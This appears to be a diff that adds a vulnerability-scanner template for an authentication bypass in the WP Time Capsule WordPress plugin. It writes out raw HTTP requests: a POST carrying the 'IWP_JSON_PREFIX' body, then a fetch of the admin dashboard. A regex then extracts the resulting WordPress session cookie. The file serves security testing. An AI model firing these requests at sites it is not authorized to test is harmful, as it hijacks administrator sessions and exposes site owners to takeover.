@@ -1,0 +1,50 @@
+id: wordpress-auth-bypass-wptimecapsule
+
+info:
+  name: WordPress WP Time Capsule Authentication Bypass
+  author: princechaddha
+  severity: critical
+  reference: https://github.com/SECFORCE/WPTimeCapsulePOC
+  tags: wordpress,wp-plugin
+
+requests:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept: */*
+
+        IWP_JSON_PREFIX
+
+      - |
+        GET /wp-admin/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        Accept: */*
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<div id="adminmenumain" role="navigation" aria-label="Main menu">'
+          - "<h1>Dashboard</h1>"
+        part: body
+        condition: and
+
+      - type: word
+        words:
+          - 'text/html'
+        part: header
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - "wordpress_[a-z0-9]+=([A-Za-z0-9%]+)"
